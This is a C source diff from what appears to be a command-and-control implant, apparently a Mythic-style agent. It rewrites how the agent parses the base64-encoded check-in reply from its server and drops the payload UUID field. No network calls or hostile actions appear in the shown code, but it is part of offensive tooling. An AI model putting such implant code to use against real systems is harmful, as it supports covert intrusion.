@@ -157,35 +157,16 @@ char *generate_checkin_message(char *payload_uuid, int len) {
 }
 
 void parse_checkin_reply(HttpResponse *response, CheckinReply *reply) {
-	// Base64 decode the response and parse the JSON fields into a struct.
+	// Base64 decode the response and unpack the fields into a struct.
 	char *decoded_body = KERNEL32$VirtualAlloc(0, response->body_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
 	base64_decode(response->body, response->body_size, decoded_body);
 	
-	char *match;
-	
-	// Parse the Payload UUID from the start of the message.
-	reply->payload_uuid = KERNEL32$VirtualAlloc(0, 255, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
-	for (int i = 0; i < 36; i++) {
-		reply->payload_uuid[i] = decoded_body[i];
-	}
-	
-	// Parse the Callback UUID from the "id" field.
-	reply->callback_uuid = KERNEL32$VirtualAlloc(0, 255, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
-	match = MSVCRT$strstr(decoded_body, "\"id\"") + 6; // Find string, then add offset to start of value
-	for (int i = 0; i < 36; i++) {
-		reply->callback_uuid[i] = match[i];
-	}
-	
-	// Parse the status message from the "status" field.
-	reply->status = KERNEL32$VirtualAlloc(0, 255, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
-	match = MSVCRT$strstr(decoded_body, "\"status\"") + 10; // Find string, then add offset to start of value
-	for (int i = 0; match[i] != '"'; i++) {
-		reply->status[i] = match[i];
-	}
+	int offset = 0;
+	reply->callback_uuid = unpack_str(decoded_body, &offset);
+	reply->status = unpack_str(decoded_body, &offset);
 }
 
 void free_checkin_reply(CheckinReply *reply) {
-	if (reply->payload_uuid != NULL) { KERNEL32$VirtualFree(reply->payload_uuid, 0, MEM_RELEASE); }
 	if (reply->callback_uuid != NULL) { KERNEL32$VirtualFree(reply->callback_uuid, 0, MEM_RELEASE); }
 	if (reply->status != NULL) { KERNEL32$VirtualFree(reply->status, 0, MEM_RELEASE); }
 }
